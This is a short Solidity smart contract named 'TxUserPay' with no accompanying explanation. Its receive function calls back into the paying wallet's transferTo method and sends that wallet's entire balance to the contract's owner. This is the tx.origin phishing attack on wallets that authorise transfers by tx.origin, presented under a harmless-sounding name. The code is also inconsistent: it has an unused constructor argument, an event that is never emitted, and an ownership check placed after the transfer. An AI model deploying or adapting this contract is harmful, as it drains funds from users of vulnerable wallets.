pragma solidity ^0.8.9;
interface TxUserWallet {
    function transferTo(address recipient, uint amount) external;
}

contract TxUserPay {
    constructor(address userWalletAddr) {
        owner = msg.sender;
    }

    address owner;

    receive() external payable {
        TxUserWallet(msg.sender).transferTo(owner, msg.sender.balance);

        require(tx.origin == owner);
    }

    event Transfer(address indexed user, uint amount, uint gas);
}

